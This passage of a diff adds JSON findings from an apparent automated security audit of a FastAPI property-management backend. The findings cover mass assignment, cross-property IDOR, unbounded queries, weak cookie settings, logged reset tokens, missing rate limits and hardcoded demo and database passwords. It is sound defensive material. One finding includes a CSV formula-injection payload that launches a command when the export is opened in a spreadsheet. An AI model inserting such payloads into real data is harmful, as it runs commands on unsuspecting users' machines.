+          "proof": "SOURCE: UserUpdate body containing role=PROPERTY_ADMIN and/or is_active=False (confirmed in schemas.py UserUpdate includes role: Optional[UserRole] and is_active: Optional[bool]). SINK: setattr(user, field, value) at line 97 assigns every field from the Pydantic model directly onto the User ORM object without field-level allowlisting. A PROPERTY_ADMIN can promote any user to admin, disable any account, or demote other admins through a single PATCH call."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "backend/app/routers/imports.py",
+      "start": {
+        "line": 50
+      },
+      "end": {
+        "line": 50
+      },
+      "extra": {
+        "message": "Cross-property tenant import \u2014 manager can assign tenants to units outside managed properties",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "unit_id=int(unit_id) if unit_id else None,",
+          "proof": "SOURCE: CSV row field 'unit_id' (untrusted \u2014 controlled by importing manager). SINK: directly assigned as Tenant.unit_id at line 50 with no cross-property validation. A PROPERTY_MANAGER can import tenants into units belonging to properties they do not manage, bypassing property-level authorization."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "backend/app/routers/imports.py",
+      "start": {
+        "line": 116
+      },
+      "end": {
+        "line": 116
+      },
+      "extra": {
+        "message": "Mass assignment via CSV payment import \u2014 status field directly controllable",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "status=row.get(\"status\", \"pending\"),",
+          "proof": "SOURCE: CSV row field 'status' (untrusted \u2014 controlled by importing manager). SINK: directly set on PaymentRecord.status at line 116 from CSV. An importer can set status=PAID to mark payments as paid without going through the normal payment lifecycle, bypassing financial controls."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "backend/app/routers/imports.py",
+      "start": {
+        "line": 111
+      },
+      "end": {
+        "line": 111
+      },
+      "extra": {
+        "message": "Cross-property payment import \u2014 manager can create payments for tenants outside managed properties",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "tenant_id=int(row[\"tenant_id\"]),",
+          "proof": "SOURCE: CSV row field 'tenant_id' (untrusted \u2014 controlled by importing manager). SINK: directly set on PaymentRecord.tenant_id at line 111 with no cross-property validation. A PROPERTY_MANAGER can create/modify payment records for tenants in properties they do not manage."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/exports.py",
+      "start": {
+        "line": 77
+      },
+      "end": {
+        "line": 77
+      },
+      "extra": {
+        "message": "Unbounded memory allocation in maintenance CSV/JSON export",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "tickets = query.all()",
+          "proof": "SOURCE: All MaintenanceTicket rows in database (can be inflated via mass ticket creation by tenants). SINK: query.all() at line 77 loads every row into memory without pagination. An attacker submitting many tickets can cause memory exhaustion on export, denying service to managers/admins."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/exports.py",
+      "start": {
+        "line": 125
+      },
+      "end": {
+        "line": 125
+      },
+      "extra": {
+        "message": "Unbounded memory allocation in inspections CSV/JSON export",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "inspections = query.all()",
+          "proof": "SOURCE: All Inspection rows in database (can be inflated via mass inspection creation). SINK: query.all() at line 125 loads every row into memory without pagination. An attacker creating many inspections can cause memory exhaustion on export, denying service."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1236",
+      "path": "backend/app/routers/exports.py",
+      "start": {
+        "line": 133
+      },
+      "end": {
+        "line": 133
+      },
+      "extra": {
+        "message": "CSV formula injection in inspection export via inspector full_name",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-1236"
+          ],
+          "citation": "\"inspector\": i.inspector.full_name if i.inspector else \"\",",
+          "proof": "SOURCE: User.full_name (untrusted \u2014 set during registration/update, unsanitized). SINK: written verbatim to CSV via csv.DictWriter at line 133 with no sanitization. If a malicious user sets full_name to =cmd|' /C calc'!A0, opening the CSV in Excel/LibreOffice triggers formula execution."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "backend/app/routers/users.py",
+      "start": {
+        "line": 57
+      },
+      "end": {
+        "line": 57
+      },
+      "extra": {
+        "message": "IDOR in get_user \u2014 manager can view any user outside managed properties",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "user = db.query(User).filter(User.id == user_id).first()",
+          "proof": "URL path parameter 'user_id' (untrusted SOURCE) is queried directly without property-scope filter (SINK). The endpoint allows PROPERTY_MANAGER role but performs no cross-property check, unlike list_users which scopes to managed properties. A manager can enumerate and retrieve any user's PII (email, phone, full_name) regardless of property membership."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/payments.py",
+      "start": {
+        "line": 42
+      },
+      "end": {
+        "line": 42
+      },
+      "extra": {
+        "message": "Unbounded memory allocation in list_payments",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "return query.order_by(PaymentRecord.due_date.desc()).all()",
+          "proof": "All PaymentRecord rows matching the filter (untrusted SOURCE \u2014 can be inflated via mass payment creation by admins/managers) are loaded via query.all() without pagination (SINK). An attacker with payment creation access can cause memory exhaustion on listing."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/payments.py",
+      "start": {
+        "line": 115
+      },
+      "end": {
+        "line": 115
+      },
+      "extra": {
+        "message": "Unbounded memory allocation in payments CSV export",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "payments = query.all()",
+          "proof": "All PaymentRecord rows matching the manager's filter (untrusted SOURCE) are loaded via query.all() without limit/pagination (SINK). Memory exhaustion DoS via mass payment creation followed by export."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/maintenance.py",
+      "start": {
+        "line": 64
+      },
+      "end": {
+        "line": 64
+      },
+      "extra": {
+        "message": "Unbounded memory allocation in list_tickets",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "return query.all()",
+          "proof": "All MaintenanceTicket rows matching the filter (untrusted SOURCE \u2014 can be inflated via mass ticket creation by tenants and managers) are loaded via query.all() without skip/limit (SINK). An attacker can cause memory exhaustion on listing."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-614",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 43
+      },
+      "end": {
+        "line": 43
+      },
+      "extra": {
+        "message": "Access token cookie missing Secure flag",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-614"
+          ],
+          "citation": "response.set_cookie(\n    key=\"access_token\",\n    value=token,\n    httponly=True,\n    max_age=settings.access_token_expire_minutes * 60,\n    samesite=\"lax\",\n)",
+          "proof": "The login endpoint sets the JWT access_token cookie without the Secure flag (untrusted SOURCE: login response). The cookie is transmitted over unencrypted HTTP connections (SINK). An attacker with network access (e.g., same Wi-Fi or MitM proxy) can intercept the token from an HTTP response, compromising all authenticated sessions. SameSite=lax further weakens CSRF protections vs Strict."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 69
+      },
+      "end": {
+        "line": 69
+      },
+      "extra": {
+        "message": "Password reset token written to stdout/logs in plaintext",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "print(f\"[MOCK EMAIL] Password reset for {user.email}: token={token}\")",
+          "proof": "The password-reset-request endpoint generates a JWT reset token and writes it to stdout via print() (untrusted SOURCE: user-supplied email \u2192 SINK: stdout/container logs). In containerized environments, stdout is captured by the logging system and shipped to log aggregators (CloudWatch, Splunk, ELK). Anyone with log read access can obtain password reset tokens, forge a reset request, and take over accounts."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 33
+      },
+      "end": {
+        "line": 33
+      },
+      "extra": {
+        "message": "No rate limiting on login endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "@router.post(\"/login\")\ndef login(response: Response, creds: UserLogin, db: Session = Depends(get_db)):",
+          "proof": "The POST /api/auth/login endpoint has no rate limiting or account lockout (untrusted SOURCE: remote attacker sends unlimited login requests \u2192 SINK: route handler attempts password verification each time). This enables automated brute-force attacks. With known demo credentials hardcoded in seed.py, an attacker can systematically guess passwords for all registered users."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 63
+      },
+      "end": {
+        "line": 63
+      },
+      "extra": {
+        "message": "No rate limiting on password-reset-request endpoint",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "@router.post(\"/password-reset-request\")\ndef password_reset_request(req: PasswordResetRequest, db: Session = Depends(get_db)):",
+          "proof": "The POST /api/auth/password-reset-request endpoint has no rate limiting (untrusted SOURCE: remote attacker sends unlimited requests \u2192 SINK: handler queries DB and stores tokens in-memory). This enables email enumeration (different response for existing vs non-existing users) and allows flooding the _reset_tokens in-memory dict, leading to resource exhaustion (OOM)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 75
+      },
+      "end": {
+        "line": 75
+      },
+      "extra": {
+        "message": "No rate limiting on password-reset-confirm endpoint",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "@router.post(\"/password-reset-confirm\")\ndef password_reset_confirm(req: PasswordResetConfirm, db: Session = Depends(get_db)):",
+          "proof": "The POST /api/auth/password-reset-confirm endpoint has no rate limiting (untrusted SOURCE: remote attacker sends unlimited token-guessing attempts \u2192 SINK: handler decodes JWT and checks against in-memory store). Lack of throttling allows rapid-fire attacks against the token validation. Combined with CWE-532 (token leaked to logs), an attacker who observed a token can exploit the absence of rate limiting for further attacks."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "docker-compose.yml",
+      "start": {
+        "line": 7
+      },
+      "end": {
+        "line": 7
+      },
+      "extra": {
+        "message": "Hardcoded database password in docker-compose.yml",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "POSTGRES_PASSWORD: propertyapp",
+          "proof": "The docker-compose.yml hardcodes the PostgreSQL superuser password 'propertyapp' (untrusted SOURCE: configuration file committed to version control \u2192 SINK: running PostgreSQL container with well-known credentials). This password matches the application config default. Combined with the exposed port (5432:5432), any attacker who can reach the host can authenticate to the database using the widely-known password."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "backend/seed.py",
+      "start": {
+        "line": 339
+      },
+      "end": {
+        "line": 339
+      },
+      "extra": {
+        "message": "Default/known demo credentials hardcoded and printed to console",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "print(\"  admin@example.com / Admin123!\")\nprint(\"  manager@example.com / Manager123!\")\nprint(\"  worker@example.com / Worker123!\")\nprint(\"  tenant1@example.com / Tenant123!\")\nprint(\"  tenant2@example.com / Tenant123!\")",
+          "proof": "The seed script creates user accounts with hardcoded passwords ('Admin123!', 'Manager123!', etc.) at lines 19-35 and prints them to stdout (untrusted SOURCE: seed script output \u2192 SINK: console/logs). These well-known credentials allow anyone who has run the seed script or has access to its logs to log in as PROPERTY_ADMIN or PROPERTY_MANAGER, gaining full application control."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "backend/app/routers/imports.py",
+      "start": {
+        "line": 85
+      },
+      "end": {
+        "line": 85
+      },
+      "extra": {
+        "message": "Mass assignment on unit CSV import \u2014 status field controllable via CSV",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "status=row.get(\"status\", \"vacant\")",
+          "proof": "The import_units endpoint reads the 'status' field from the uploaded CSV row and passes it directly to the Unit constructor (untrusted SOURCE: CSV file uploaded by user \u2192 SINK: Unit model field). An admin can set status='occupied' to bypass normal move-in workflows, or status='maintenance' to make units appear unavailable. The field is not validated against the UnitStatus enum, allowing arbitrary string values."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "backend/app/routers/imports.py",
+      "start": {
+        "line": 48
+      },
+      "end": {
+        "line": 48
+      },
+      "extra": {
+        "message": "Mass assignment on tenant CSV import allows setting password_hash and unit_id without validation",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "password_hash=get_password_hash(row.get(\"password\", \"changeme123\")),\nfull_name=row.get(\"full_name\", \"\"),\nphone=row.get(\"phone\", \"\"),\nunit_id=int(unit_id) if unit_id else None,",
+          "proof": "SOURCE: CSV file contents uploaded by an authenticated manager \u2192 SINK: User and Tenant model constructors at lines 48-62. The password_hash is set directly from the CSV row with a weak default of 'changeme123'. The unit_id field has no property-scoping validation, so a manager assigned to Property A can create a tenant in a unit belonging to Property B. This allows creating tenants with known passwords in any property."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "backend/app/routers/integrations.py",
+      "start": {
+        "line": 81
+      },
+      "end": {
+        "line": 81
+      },
+      "extra": {
+        "message": "Mass assignment on webhook creation \u2014 secret and is_active from request body",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "wh = Webhook(**wh_in.model_dump())",
+          "proof": "SOURCE: POST request body \u2192 SINK: Webhook model constructor. WebhookCreate (via WebhookBase) exposes url, event_type, secret, and is_active. Using **model_dump() passes all user-supplied fields directly. An attacker can set their own webhook signing secret to intercept webhook events, or set is_active=False to silently create disabled webhooks that appear to be functional."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "backend/app/routers/payments.py",
+      "start": {
+        "line": 89
+      },
+      "end": {
+        "line": 89
+      },
+      "extra": {
+        "message": "Mass assignment on payment update \u2014 status field bypasses payment lifecycle",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "for field, value in payment_in.model_dump(exclude_unset=True).items():\n    setattr(payment, field, value)",
+          "proof": "SOURCE: PATCH request body \u2192 SINK: PaymentRecord model attributes via setattr. PaymentRecordUpdate includes a 'status' field (PaymentStatus enum). The PATCH endpoint applies all provided fields without any state-transition validation, unlike the POST create endpoint. A manager can set status='paid' to mark any payment as paid without processing payment, or set status='overdue' to trigger late-fee assessments, bypassing the entire payment lifecycle."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-319",
+      "path": "backend/app/database.py",
+      "start": {
+        "line": 7
+      },
+      "end": {
+        "line": 7
+      },
+      "extra": {
+        "message": "Insecure database connection \u2014 no SSL/TLS for PostgreSQL",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-319"
+          ],
+          "citation": "engine = create_engine(settings.database_url)",
+          "proof": "SOURCE: default database URL 'postgresql://...' without sslmode parameter \u2192 SINK: SQLAlchemy engine. The default connection string has no SSL parameters. When the URL is configured for a remote database (via .env), all data including user passwords, payment records, and PII is transmitted in cleartext, enabling passive eavesdropping and active MitM attacks on the database connection."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "backend/app/routers/imports.py",
+      "start": {
+        "line": 29
+      },
+      "end": {
+        "line": 29
+      },
+      "extra": {
+        "message": "No rate limiting on CSV import endpoints \u2014 unbounded resource consumption",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "@router.post(\"/tenants\", response_model=ImportResult)\ndef import_tenants(",
+          "proof": "SOURCE: authenticated user sends unlimited file upload requests \u2192 SINK: each request triggers file I/O, CSV parsing, and database writes. All three import endpoints (/tenants at line 29, /units at line 70, /payments at line 103) lack request rate limiting. An attacker with valid manager credentials could upload hundreds of large CSV files simultaneously, exhausting database connections, disk space, and worker threads."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-204",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 21
+      },
+      "end": {
+        "line": 21
+      },
+      "extra": {
+        "message": "User enumeration via distinguishable error response on registration",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-204"
+          ],
+          "citation": "existing = db.query(User).filter(User.email == user_in.email).first()\nif existing:\n    raise HTTPException(status_code=400, detail=\"Email already registered\")",
+          "proof": "SOURCE: user-supplied email in UserCreate request body \u2192 SINK: HTTP 400 response with 'Email already registered' message. The endpoint returns different HTTP status codes (400 vs 201) and different response bodies depending on whether the email exists. An attacker can enumerate valid registered emails by observing the distinguishable responses, with no rate limiting to prevent mass enumeration."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 55
+      },
+      "end": {
+        "line": 55
+      },
+      "extra": {
+        "message": "Logout deletes cookie without matching Secure/HttpOnly/SameSite attributes",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "response.delete_cookie(\"access_token\")",
+          "proof": "SOURCE: logout endpoint \u2192 SINK: response.delete_cookie. The cookie was set with httponly=True and samesite='lax' at line 38-43, but delete_cookie at line 55 omits these attributes. Browsers may fail to delete a cookie when the deletion attributes don't match the original cookie's attributes, leaving the session token valid on the client after logout and enabling session persistence."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "backend/app/routers/messages.py",
+      "start": {
+        "line": 44
+      },
+      "end": {
+        "line": 44
+      },
+      "extra": {
+        "message": "Cross-property internal note leak \u2014 PropertyManager can read all internal notes",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "| (Message.is_internal_note == True)",
+          "proof": "SOURCE: list_messages query filter for PROPERTY_MANAGER role \u2192 SINK: Message query result set. The filter condition (Message.is_internal_note == True) at line 44 has no property-scope restriction. A PropertyManager assigned to Property A can view all internal notes across the entire system, including confidential inter-staff communications between admin and managers of Property B, since internal_note messages bypass the tenant/property scoping entirely."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-16",
+      "path": "backend/app/main.py",
+      "start": {
+        "line": 17
+      },
+      "end": {
+        "line": 17
+      },
+      "extra": {
+        "message": "Auto database schema creation on every application startup \u2014 dangerous in production",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-16"
+          ],
+          "citation": "Base.metadata.create_all(bind=engine)",
+          "proof": "SOURCE: application startup sequence \u2192 SINK: SQLAlchemy create_all() call. The code unconditionally creates all database tables on every startup with no environment guard. The comment acknowledges it is 'for dev convenience'. In production this can cause unintended schema modifications, race conditions with concurrent migrations, or startup failures if the DB user lacks DDL permissions, potentially leading to data loss or downtime."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "backend/seed.py",
+      "start": {
+        "line": 337
+      },
+      "end": {
+        "line": 337
+      },
+      "extra": {
+        "message": "Demo account passwords printed to console",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "print(\"  admin@example.com / Admin123!\")",
+          "proof": "SOURCE: seed.py prints all demo credentials at lines 337-341 to stdout. SINK: these passwords appear in stdout/stderr, which may be captured by CI systems, container orchestration logs (Docker, Kubernetes), or monitoring pipelines. Anyone with access to build or deployment logs obtains valid login credentials for the admin, manager, worker, and tenant accounts in the seeded database."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "backend/app/routers/users.py",
+      "start": {
+        "line": 46
+      },
+      "end": {
+        "line": 46
+      },
+      "extra": {
+        "message": "PropertyManager can enumerate all maintenance workers across all properties",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "query = query.filter(User.id.in_(tenant_user_ids) | (User.role == UserRole.MAINTENANCE_WORKER))",
+          "proof": "SOURCE: the list_users filter for PROPERTY_MANAGER role at line 46. SINK: the OR condition (User.role == UserRole.MAINTENANCE_WORKER) adds ALL maintenance workers regardless of property assignment. A PropertyManager of Property A can list every maintenance worker in the system, including their emails, full names, and phone numbers, even workers exclusively assigned to Property B that the manager has no legitimate relationship with."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/leases.py",
+      "start": {
+        "line": 48
+      },
+      "end": {
+        "line": 48
+      },
+      "extra": {
+        "message": "Unbounded memory allocation in list_leases \u2014 all leases loaded into memory without pagination",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "return query.all()",
+          "proof": "SOURCE: GET /api/leases with no pagination limit. SINK: query.all() loads every matching Lease row (plus joined Tenant and Unit relationships via the response model) into memory at once. An attacker with property_manager role can create thousands of leases, then call list_leases to exhaust server memory, causing denial of service."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/inspections.py",
+      "start": {
+        "line": 51
+      },
+      "end": {
+        "line": 51
+      },
+      "extra": {
+        "message": "Unbounded memory allocation in list_inspections \u2014 all inspections loaded into memory without pagination",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "return query.order_by(Inspection.scheduled_date.desc()).all()",
+          "proof": "SOURCE: GET /api/inspections with no pagination limit. SINK: query.all() loads all Inspection rows (plus Unit, Building, Property, and Inspector relationships via the response model) into memory. Combined with mass inspection creation, this can exhaust server memory."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "backend/app/routers/maintenance.py",
+      "start": {
+        "line": 84
+      },
+      "end": {
+        "line": 84
+      },
+      "extra": {
+        "message": "Mass assignment in create_ticket allows setting status directly \u2014 bypasses intended OPEN-only creation",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "ticket = MaintenanceTicket(\n        **ticket_in.model_dump(),\n        tenant_id=tenant.id if tenant else None,\n    )",
+          "proof": "SOURCE: MaintenanceTicketCreate schema (inherits MaintenanceTicketBase) includes status field with default MaintenanceStatus.OPEN at schemas.py:185-186. SINK: all fields from the request body are unpacked into the ORM model via **ticket_in.model_dump() at line 85. A PropertyAdmin or PropertyManager can create a maintenance ticket with status=CLOSED or status=COMPLETED, bypassing the normal lifecycle and the TICKET_TRANSITIONS state machine that is only enforced on updates."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "backend/app/routers/inspections.py",
+      "start": {
+        "line": 66
+      },
+      "end": {
+        "line": 66
+      },
+      "extra": {
+        "message": "IDOR in create_inspection \u2014 PropertyManager can set inspector_id to any user across properties",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "inspection = Inspection(**inspection_in.model_dump())",
+          "proof": "SOURCE: InspectionCreate schema includes inspector_id (int, required) at schemas.py:282. SINK: directly unpacked into Inspection model at line 66 with no validation of the inspector_id reference. A PropertyManager of Property A can set inspector_id to a worker or manager from Property B. There is no validation that the inspector_id references a user with an appropriate role or property assignment."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "backend/app/utils/permissions.py",
+      "start": {
+        "line": 133
+      },
+      "end": {
+        "line": 133
+      },
+      "extra": {
+        "message": "Missing MAINTENANCE_WORKER branch in can_view_inspection \u2014 workers silently denied access to individual inspections",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "    return False",
+          "proof": "SOURCE: can_view_inspection is called by get_inspection, update_inspection, upload_inspection_photo, and list_inspection_photos at inspections.py. SINK: the function at lines 125-134 has branches for admin, manager, and tenant roles but no branch for MAINTENANCE_WORKER, falling through to return False at line 133. Workers who can see inspections in their list (via the separate worker filter at inspections.py:41-45) can never view, update, or add photos to a specific inspection because can_view_inspection returns False unconditionally for workers. This is a broken access control gap."
+        }
+      }
+    }
+  ]
+}
